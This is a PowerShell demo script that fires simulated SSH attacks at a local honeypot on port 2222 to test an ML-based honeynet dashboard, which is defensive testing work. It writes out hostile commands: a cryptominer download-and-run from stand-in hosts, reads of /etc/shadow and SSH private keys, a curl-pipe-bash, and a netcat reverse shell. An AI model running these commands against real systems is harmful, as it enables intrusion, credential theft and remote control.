# AI-Driven Adaptive Honeynet - Live Demo Attack Script
# This script simulates real attacks to demonstrate ML classification

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "AI-DRIVEN ADAPTIVE HONEYNET - DEMO" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[DEMO] Starting attack simulation..." -ForegroundColor Yellow
Write-Host ""

# Attack 1: HIGH Severity - Malware Download + Execution
Write-Host "[Attack 1] HIGH SEVERITY: Malware download + execution" -ForegroundColor Red
Write-Host "Command: wget http://malicious.com/cryptominer.sh && bash cryptominer.sh" -ForegroundColor Gray
echo "123456" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@localhost -p 2222 "wget http://malicious.com/cryptominer.sh && chmod +x cryptominer.sh && bash cryptominer.sh" 2>$null
Start-Sleep -Seconds 3

# Attack 2: HIGH Severity - Password Harvesting
Write-Host "`n[Attack 2] HIGH SEVERITY: Password harvesting" -ForegroundColor Red
Write-Host "Command: cat /etc/shadow && cat /etc/passwd" -ForegroundColor Gray
echo "admin" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@localhost -p 2222 "cat /etc/shadow && cat /etc/passwd && cat ~/.ssh/id_rsa" 2>$null
Start-Sleep -Seconds 3

# Attack 3: HIGH Severity - Reverse Shell
Write-Host "`n[Attack 3] HIGH SEVERITY: Reverse shell attempt" -ForegroundColor Red
Write-Host "Command: curl http://attacker.com/shell.sh | bash" -ForegroundColor Gray
echo "password" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 admin@localhost -p 2222 "curl http://attacker.com/shell.sh | bash; nc -e /bin/bash 10.0.0.1 4444" 2>$null
Start-Sleep -Seconds 3

# Attack 4: LOW Severity - Reconnaissance
Write-Host "`n[Attack 4] LOW SEVERITY: Basic reconnaissance" -ForegroundColor Green
Write-Host "Command: whoami && ls -la" -ForegroundColor Gray
echo "test123" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 user@localhost -p 2222 "whoami && ls -la && pwd" 2>$null
Start-Sleep -Seconds 3

# Attack 5: MEDIUM Severity - File System Exploration
Write-Host "`n[Attack 5] MEDIUM SEVERITY: File system exploration" -ForegroundColor Yellow
Write-Host "Command: find / -name '*.key' -o -name '*.pem'" -ForegroundColor Gray
echo "root" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@localhost -p 2222 "find / -name '*.key' -o -name '*.pem' 2>/dev/null" 2>$null
Start-Sleep -Seconds 3

Write-Host "`n=====================================" -ForegroundColor Cyan
Write-Host "✅ Attack simulation complete!" -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Check your dashboard at http://localhost:5173" -ForegroundColor Cyan
Write-Host "Watch for:" -ForegroundColor Yellow
Write-Host "  1. New events appearing in 'Recent Events'" -ForegroundColor White
Write-Host "  2. ML anomaly scores being assigned (0.0-1.0)" -ForegroundColor White
Write-Host "  3. Severity distribution pie chart updating" -ForegroundColor White
Write-Host "  4. HIGH severity events triggering adaptations" -ForegroundColor White
Write-Host ""
